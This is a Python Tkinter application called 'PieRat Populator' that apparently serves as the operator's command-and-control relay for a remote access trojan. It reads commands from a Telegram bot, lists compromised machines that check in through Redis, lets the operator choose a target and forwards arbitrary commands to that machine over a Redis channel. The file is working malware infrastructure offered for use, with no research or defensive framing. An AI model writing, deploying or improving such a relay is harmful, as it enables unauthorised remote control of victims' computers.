import tkinter as tk
from tkinter import messagebox
import redis
import requests
import json
import threading
from datetime import datetime, timezone
import asyncio

class PieRatPopulatorApp:
    def __init__(self, root):
        self.root = root
        self.root.title("PieRat Populator")

        self.telegram_bot_token = tk.StringVar()
        self.redis_host = tk.StringVar()
        self.redis_port = tk.IntVar()
        self.redis_password = tk.StringVar()
        self.is_running = False
        self.thread = None

        
        self.redis_client = None
        self.selected_computer = None

        
        self.create_widgets()

    def create_widgets(self):
        """Create GUI elements."""
        tk.Label(self.root, text="Telegram Bot Token:").grid(row=0, column=0, sticky="e")
        tk.Entry(self.root, textvariable=self.telegram_bot_token, width=40).grid(row=0, column=1)

        tk.Label(self.root, text="Redis Host:").grid(row=1, column=0, sticky="e")
        tk.Entry(self.root, textvariable=self.redis_host).grid(row=1, column=1)

        tk.Label(self.root, text="Redis Port:").grid(row=2, column=0, sticky="e")
        tk.Entry(self.root, textvariable=self.redis_port).grid(row=2, column=1)

        tk.Label(self.root, text="Redis Password:").grid(row=3, column=0, sticky="e")
        tk.Entry(self.root, textvariable=self.redis_password, show="*").grid(row=3, column=1)

        self.start_button = tk.Button(self.root, text="Start", command=self.start)
        self.start_button.grid(row=4, column=0, pady=10)

        self.stop_button = tk.Button(self.root, text="Stop", command=self.stop, state=tk.DISABLED)
        self.stop_button.grid(row=4, column=1, pady=10)

    def start(self):
        
        try:
            # Set up Redis connection
            self.redis_client = redis.Redis(
                host=self.redis_host.get(),
                port=self.redis_port.get(),
                password=self.redis_password.get(),
                decode_responses=True,
            )
            self.is_running = True
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.NORMAL)

            # Start the thread
            self.thread = threading.Thread(target=self.run_pierat_populator, daemon=True)
            self.thread.start()
            messagebox.showinfo("Info", "PieRat Populator Started!")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to start: {e}")

    def stop(self):
        
        self.is_running = False
        if self.thread and self.thread.is_alive():
            self.thread.join(timeout=2)
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        messagebox.showinfo("Info", "PieRat Populator Stopped!")

    def run_pierat_populator(self):
        
        TELEGRAM_API_URL = f"https://api.telegram.org/bot{self.telegram_bot_token.get()}"
        REDIS_COMMAND_CHANNEL = "commands"
        REDIS_STATUS_CHANNEL = "status"

        async def fetch_telegram_updates():
            offset = 0
            while self.is_running:
                try:
                    response = requests.get(
                        f"{TELEGRAM_API_URL}/getUpdates", params={"offset": offset, "timeout": 30}
                    )
                    updates = response.json()
                    if updates.get("ok"):
                        for update in updates["result"]:
                            offset = update["update_id"] + 1
                            self.process_telegram_update(update, REDIS_COMMAND_CHANNEL, REDIS_STATUS_CHANNEL)
                except requests.RequestException as e:
                    print(f"Error fetching Telegram updates: {e}")
                await asyncio.sleep(1)

        async def clear_redis_periodically():
            while self.is_running:
                self.redis_client.delete(REDIS_COMMAND_CHANNEL)
                self.redis_client.delete(REDIS_STATUS_CHANNEL)
                await asyncio.sleep(30)

        async def main_loop():
            
            await asyncio.gather(fetch_telegram_updates(), clear_redis_periodically())

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(main_loop())
        except asyncio.CancelledError:
            pass
        finally:
            loop.close()

    def process_telegram_update(self, update, command_channel, status_channel):
        
        if "message" in update:
            chat_id = update["message"]["chat"]["id"]
            text = update["message"].get("text", "")

            if text == "/list_computers":
                self.list_computers(chat_id, status_channel)
            elif text.startswith("/set_computer"):
                try:
                    _, computer_id = text.split(maxsplit=1)
                    self.set_computer(chat_id, computer_id, status_channel)
                except ValueError:
                    self.send_telegram_message(chat_id, "Usage: /set_computer <COMPUTER_ID>")
            else:
                self.forward_command(chat_id, text, command_channel)

    def list_computers(self, chat_id, status_channel):
        
        computers = self.redis_client.hgetall(status_channel)
        now = datetime.now(timezone.utc)
        online_computers = []

        for comp_id, last_seen in computers.items():
            try:
                last_seen_time = datetime.fromisoformat(last_seen).replace(tzinfo=timezone.utc)
            except ValueError:
                online_computers.append(f"{comp_id} (Invalid timestamp)")
                continue

            time_diff = (now - last_seen_time).total_seconds()
            if time_diff < 15:
                online_computers.append(f"{comp_id} (Last seen: {int(time_diff)} seconds ago)")

        message = "Connected Computers:\n" + "\n".join(online_computers) if online_computers else "No computers are currently online."
        self.send_telegram_message(chat_id, message)

    def set_computer(self, chat_id, computer_id, status_channel):
        """Set the target computer for commands."""
        try:
            computers = self.redis_client.hgetall(status_channel)
            if computer_id in computers:
                self.selected_computer = computer_id
                self.redis_client.set("current_computer", computer_id)
                self.send_telegram_message(chat_id, f"Selected computer: {computer_id}")
            else:
                self.send_telegram_message(chat_id, f"Computer ID {computer_id} not found.")
        except redis.RedisError as e:
            print(f"Error accessing Redis: {e}")
            self.send_telegram_message(chat_id, "Error setting computer.")

    def forward_command(self, chat_id, text, command_channel):
        
        if not self.selected_computer:
            self.send_telegram_message(chat_id, "No computer selected. Use /set_computer <COMPUTER_ID> first.")
            return

        try:
            command = json.dumps({"target": self.selected_computer, "chat_id": chat_id, "command": text})
            self.redis_client.publish(command_channel, command)
            print(f"Command sent to computer {self.selected_computer}.")
        except redis.RedisError as e:
            print(f"Error publishing command to Redis: {e}")
            self.send_telegram_message(chat_id, "Error forwarding command.")

    def send_telegram_message(self, chat_id, text):
        
        TELEGRAM_API_URL = f"https://api.telegram.org/bot{self.telegram_bot_token.get()}/sendMessage"
        try:
            payload = {"chat_id": chat_id, "text": text}
            requests.post(TELEGRAM_API_URL, json=payload)
        except requests.RequestException as e:
            print(f"Error sending Telegram message: {e}")


if __name__ == "__main__":
    root = tk.Tk()
    app = PieRatPopulatorApp(root)
    root.mainloop()
